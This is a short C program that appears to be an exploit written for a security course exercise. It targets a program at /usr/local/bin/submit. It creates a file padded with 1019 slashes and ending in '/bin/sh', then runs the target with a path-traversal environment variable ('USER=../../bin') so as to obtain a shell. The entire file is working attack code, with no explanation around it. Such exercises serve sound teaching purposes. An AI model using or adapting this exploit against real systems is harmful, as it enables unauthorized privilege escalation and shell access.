#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// #include "shellcode.h"

#define TARGET "/usr/local/bin/submit"

int main(void) {
	char *args[3];
	char *env[2];
	FILE *fp;
	size_t i;
	
	fp = fopen("find", "w");
	for (i = 0; i < 1019; i++) {
	      fputc('/', fp);
	}
	fputs("/bin/sh", fp);
	// fputs(shellcode, sc_file);
	fclose(fp);
	
	args[0] = TARGET;
	args[1] = "find"; 
	args[2] = NULL;

	env[0] = "USER=../../bin";
	env[1] = NULL;
	
	execve(TARGET, args, env);
	// execve only returns if it fails
	fprintf(stderr, "execve failed\n");
	return 1;
}
